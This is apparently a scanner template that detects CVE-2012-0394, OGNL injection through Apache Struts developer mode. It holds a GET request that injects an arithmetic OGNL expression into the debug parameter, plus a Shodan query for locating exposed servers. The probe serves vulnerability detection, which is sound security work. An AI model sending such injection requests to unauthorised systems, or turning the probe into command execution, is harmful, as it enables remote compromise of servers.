id: CVE-2012-0394
info:
  author: tess
  classification:
    cve-id: CVE-2012-0394
  description: 'The DebuggingInterceptor component in Apache Struts before 2.3.1.1,
    when developer mode is used, allows remote attackers to execute arbitrary commands
    via unspecified vectors. NOTE: the vendor characterizes this behavior as not "a
    security vulnerability itself."

    '
  metadata:
    shodan-query: html:"Struts Problem Report"
    verified: 'true'
  name: Apache Struts Dev Mode OGNL Injection
  reference:
  - https://www.pwntester.com/blog/2014/01/21/struts-2-devmode-an-ognl-backdoor/
  - https://www.exploit-db.com/exploits/31434
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0394
  - http://www.exploit-db.com/exploits/18329
  severity: critical
  tags: ognl,injection,edb,cve,cve2012,apache,struts
requests:
- matchers:
  - type: word
    words:
    - '{{result}}'
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/portal/displayAPSForm.action?debug=command&expression={{first}}*{{second}}'
variables:
  first: '{{rand_int(1000, 9999)}}'
  result: '{{to_number(first)*to_number(second)}}'
  second: '{{rand_int(1000, 9999)}}'
